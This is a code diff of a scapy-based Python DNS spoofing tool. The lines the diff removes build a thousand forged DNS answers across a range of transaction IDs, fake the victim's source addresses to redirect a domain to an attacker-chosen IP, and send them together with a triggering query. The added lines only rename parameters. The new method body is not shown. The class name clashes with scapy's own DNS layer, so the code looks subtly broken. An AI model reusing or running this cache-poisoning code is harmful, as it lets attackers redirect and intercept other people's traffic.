@@ -9,17 +9,9 @@ from scapy.layers.l2 import *
 
 
 class DNS:
-    def __init__(self, DOMAIN, IP_REDIR):
-        self.DOMAIN = DOMAIN
-        self.IP_REDIR = IP_REDIR
+    def __init__(self, domain, ip_redirect):
+        self.domain = domain
+        self.ip_redirect = ip_redirect
 
     @staticmethod
-    def spoof(DOMAIN, IP_REDIR):
-        pkts = []
-        for x in range(10000, 11000):
-            pkt = Ether(src="MAC_REDIR", dst="MAC_VICTIM")/IP(dst=IP_REDIR,src="IP_VICTIM")/UDP(dport=53)/DNS(id=x,an=DNSRR(rrname=DOMAIN, type='A', rclass='IN', ttl=350, rdata=IP_REDIR))
-            pkts.append(pkt)
-        dns = Ether(src="MAC_REDIR", dst="MAC_VM")/IP(dst=IP_REDIR, src="IP_VM")/UDP()/DNS(qd=DNSQR(qname=DOMAIN))
-        sendp(dns, verbose=0)
-        for pkt in pkts:
-            sendp(pkt, verbose=0)
+    def spoof(domain, ip_redirect):
